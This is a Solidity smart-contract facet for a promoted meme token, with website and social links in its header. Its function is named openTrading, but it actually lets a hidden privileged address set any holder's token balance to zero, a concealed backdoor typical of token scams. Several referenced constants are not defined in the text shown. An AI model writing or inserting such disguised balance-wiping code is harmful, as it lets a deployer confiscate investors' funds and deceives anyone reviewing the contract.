/*  
   * SPDX-License-Identifier: MIT 

    Website:  https://www.welikethefox.io/
    Twitter:  https://twitter.com/FoxyLinea
    Medium:  https://welikethefox.medium.com/
    Telegram: https://t.me/WeLikeTheFox


*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
